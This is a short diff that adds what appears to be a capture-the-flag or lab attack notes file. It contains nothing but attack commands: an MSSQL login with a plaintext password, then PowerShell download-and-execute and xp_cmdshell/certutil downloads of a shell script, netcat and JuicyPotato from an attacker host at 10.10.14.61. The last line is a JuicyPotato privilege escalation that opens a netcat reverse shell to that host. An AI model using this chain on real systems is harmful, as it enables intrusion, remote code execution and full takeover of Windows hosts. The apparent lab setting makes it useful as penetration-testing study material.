@@ -1,0 +1,13 @@
+python mssqlclient.py sql_dev@10.129.43.43 -windows-auth
+Str0ng_P@ssw0rd!
+
+
+powershell IEX (New-Object Net.WebClient).DownloadString('10.10.14.61/shell.ps1')
+
+xp_cmdshell certutil -urlcache -f "http://10.10.14.61/shell.ps1" "C:/Windows/temp/shell.ps1"
+
+certutil -urlcache -f "http://10.10.14.61/nc.exe" "C:/Windows/temp/nc.exe"
+
+certutil -urlcache -f "http://10.10.14.61/JuicyPotato.exe" "C:/Windows/temp/JuicyPotato.exe"
+
+C:/Windows/temp/JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:/Windows/temp/nc.exe 10.10.14.61 3333 -e cmd.exe" -t *
